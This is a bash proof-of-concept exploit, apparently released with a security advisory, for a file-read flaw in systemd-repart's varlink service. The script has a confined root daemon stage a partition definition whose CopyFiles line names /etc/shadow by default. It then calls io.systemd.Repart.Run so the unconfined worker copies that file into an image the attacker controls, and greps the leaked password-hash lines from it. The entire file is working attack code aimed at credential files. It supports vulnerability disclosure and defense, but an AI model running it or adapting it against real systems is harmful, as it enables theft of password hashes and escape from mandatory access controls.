#!/bin/bash

# LinnemanLabs - Repart arbitrary file-read PoC
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# a confined uid-0 daemon can read a file it cannot open by having the
# unconfined systemd-repart worker CopyFiles it into an image we own
# default reads /etc/shadow; source path must be on the host root fs
#
# systemd-repart varlink exists on systemd >= 259

# file to read
SRC="${1:-/etc/shadow}"
# dir our confined domain can write
WORK="${2:-/var/lib/bluetooth/rp}"
NODE="${WORK}/leakfs"

set -eu
# stage a repart.d definition
echo "[*] creating ${WORK}/defs and staging ${WORK}/defs/10.conf"
mkdir -p "${WORK}/defs"
printf "[Partition]\nType=linux-generic\nFormat=ext4\nSizeMinBytes=16M\nCopyFiles=${SRC}:/leaked\n" > "${WORK}/defs/10.conf"
# stage a file for repart to build image in
echo "[*] creating image ${NODE} for repart to write DDI to"
dd if=/dev/zero of="${NODE}" bs=1M count=48 status=none
sumbefore="$( sha256sum ${NODE} )"

# call Repart.Run, service runs unconfined_service_t and reads SRC for us
echo "[*] calling Repart Varlink to create DDI with ${SRC}"
varlinkctl call /run/systemd/io.systemd.Repart io.systemd.Repart.Run \
  "{\"node\":\"${NODE}\",\"empty\":\"force\",\"dryRun\":false,\"definitions\":[\"${WORK}/defs\"]}"

sumafter="$( sha256sum ${NODE} )"
if [ "${sumbefore}" == "${sumafter}" ];then
  echo "[-] ${NODE} hash unchanged. varlinkctl failed? systemd >= 259?"
fi

# we could find a helper to mount the image, but we also own the file
# so we can just grep for relevant bytes
OUT="$( strings "${NODE}" | grep -m1 -E '^root:|^[A-Za-z0-9._-]+:\$' )"
if [ "${OUT}x" != "x" ]; then
  echo "[+] leaked from ${SRC}:"
  echo "    ${OUT}"
else
  echo "[-] no grep match. did you change SRC to something other than /etc/shadow?"
fi

# clean up
rm -rf "${WORK}"

exit 0
